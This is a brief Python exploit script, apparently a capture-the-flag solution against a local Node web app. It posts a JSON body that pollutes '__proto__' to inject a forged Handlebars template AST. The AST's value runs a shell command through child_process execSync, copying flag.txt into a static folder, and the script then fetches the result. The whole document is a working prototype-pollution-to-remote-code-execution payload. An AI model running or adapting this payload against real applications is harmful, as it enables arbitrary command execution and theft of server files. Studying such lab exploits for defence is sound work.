import requests
URL = "http://localhost:8888/"
r = requests.post(URL, json = {
    "techy.name" : "Albert",
    "__proto__.type" : "Program",
    "__proto__.body" : [{
        "type" : "MustacheStatement",
        "path" : 0,
        "params" : [{
            "type" : "NumberLiteral",
            "value" : "process.mainModule.require('child_process').execSync(` cat flag.txt > ./static/out`)"
        }],
    "loc": {
        "start":0,
        "end": 0  }
    }]
})
print(requests.get(URL+"assets/out").text)